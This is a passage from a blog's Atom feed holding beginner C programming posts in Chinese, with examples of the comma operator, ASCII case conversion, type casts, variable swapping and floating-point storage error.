逗号表达式 </span><br><span class="line">*/</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">i=(1,2,3,4);</span><br><span class="line">printf(&quot;%d&quot;,i);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">从左到右执行</span><br><span class="line">最终表达式的值是最后一项的值 </span><br><span class="line">*/ </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;C语言运算符&lt;/p&gt;</summary>
    
    
    
    <category term="C语言" scheme="http://blog.hvvl404.fun/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础</title>
    <link href="http://blog.hvvl404.fun/2023/05/07/C/1_C%E5%9F%BA%E7%A1%80/"/>
    <id>http://blog.hvvl404.fun/2023/05/07/C/1_C%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-07T13:35:04.267Z</published>
    <updated>2023-05-07T13:47:01.013Z</updated>
    
    <content type="html"><![CDATA[<p>C语言基础</p><span id="more"></span><h4 id="一、第一个程序"><a href="#一、第一个程序" class="headerlink" title="一、第一个程序"></a>一、第一个程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="二、ASCII-的运用"><a href="#二、ASCII-的运用" class="headerlink" title="二、ASCII 的运用"></a>二、ASCII 的运用</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月21日 </span></span><br><span class="line"><span class="comment">目的：字母大小写之间的转换（ASCII码的运用） </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> c1;</span><br><span class="line"><span class="type">char</span> c2;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c %c&quot;</span>,&amp;c1,&amp;c2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c,%c&quot;</span>,c1=c1+<span class="number">32</span>,c2=c2<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">总结： ASCII不是一个值，而是一种规定，</span></span><br><span class="line"><span class="comment">       ASCII规定了不同的字符是使用哪个整数值去表示</span></span><br><span class="line"><span class="comment">       详见请看图表 </span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><br><h4 id="三、转义字符"><a href="#三、转义字符" class="headerlink" title="三、转义字符"></a>三、转义字符</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月23日 </span></span><br><span class="line"><span class="comment">目的：转义字符 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> a;</span><br><span class="line">a=(<span class="type">int</span>)<span class="number">2.3</span>;        <span class="comment">//转换为整型int </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,a);  <span class="comment">//要注意的是原来数值的类型是什么，要输入对应的输出运算符 </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">b=(<span class="type">float</span>)<span class="number">15</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,b);  <span class="comment">//这里因为只能用%d，不能将转换后的值输出 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="四、互换变量"><a href="#四、互换变量" class="headerlink" title="四、互换变量"></a>四、互换变量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月21日 </span></span><br><span class="line"><span class="comment">目的：互换变量 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">t=a;</span><br><span class="line">a=b;</span><br><span class="line">b=t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,a,b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">注意：两个变量之间互换是不能实现的，必须</span></span><br><span class="line"><span class="comment">      有一个“容器”来装其中一个变量，再赋给</span></span><br><span class="line"><span class="comment">  另一个变量 </span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><br><h4 id="五、浮点数的存储误差"><a href="#五、浮点数的存储误差" class="headerlink" title="五、浮点数的存储误差"></a>五、浮点数的存储误差</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年10月11日 </span></span><br><span class="line"><span class="comment">目的：浮点数的存储误差 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> i=<span class="number">99.9</span>;      </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,i);     <span class="comment">//结果是99.900002 </span></span><br><span class="line">i=f(<span class="number">5</span>);               <span class="comment">//浮点数不能准确的存储数据 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h4 id="六、规范写代码"><a href="#六、规范写代码" class="headerlink" title="六、规范写代码"></a>六、规范写代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">时间：2021年9月20日 </span></span><br><span class="line"><span class="comment">目的：规范写法</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入数值：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;C语言基础&lt;/p&gt;</summary>
    
    
    
    <category term="C语言" scheme="http://blog.hvvl404.fun/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
</feed>
